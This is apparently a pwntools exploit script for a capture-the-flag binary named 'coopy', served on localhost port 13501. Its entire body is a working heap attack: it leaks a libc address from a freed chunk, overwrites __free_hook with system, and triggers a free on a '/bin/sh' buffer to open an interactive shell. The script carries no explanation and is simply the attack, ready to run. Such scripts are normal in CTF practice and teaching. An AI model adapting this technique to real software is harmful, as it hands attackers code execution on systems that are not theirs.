from pwn import *
# from exploit import *

# p = exploit_source("./coopy.bin", "")
# p = process("./coopy")
# p = process(argv=["./ld-2.31.so", "./coopy"], env={"LD_PRELOAD": "./libc-2.31.so"})
p = remote("localhost", 13501)

def add(s):
    p.sendlineafter(">", "1")
    p.sendlineafter("string", s)

def read(i):
    p.sendlineafter(">", "2")
    p.sendlineafter("index", str(i))
    p.recvuntil(f"v[{i}]: ")
    return p.recvline()

def write(i, s):
    p.sendlineafter(">", "3")
    p.sendlineafter("index", str(i))
    p.sendlineafter("string", s)

add("A" * 0x500)
add("B" * 0x20)
add("C" * 0x20)
add("D" * 0x20)

add(flat({0: "/bin/sh\0"}, length=0x500))

libc_leak = read(0)[0x1a0:0x1a0+8]
libc_leak = u64(libc_leak)
info(f"{hex(libc_leak) = }")
# pause()

libc = ELF('./libc-2.31.so')
# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
libc.address = libc_leak - 0x1ecbe0 # + 0x1000
info(f"{hex(libc.address) = }")
heap_dealloc_seg = read(1)[8:16]
info(hex(u64(heap_dealloc_seg)))
write(1, p64(libc.symbols['__free_hook']) + heap_dealloc_seg)
# pause()
add(p64(libc.symbols['system']) + p64(0) + p64(0) + p64(0))

add("G")
add("H")

pause()
add("I") # trigger free

# pause()

p.interactive()
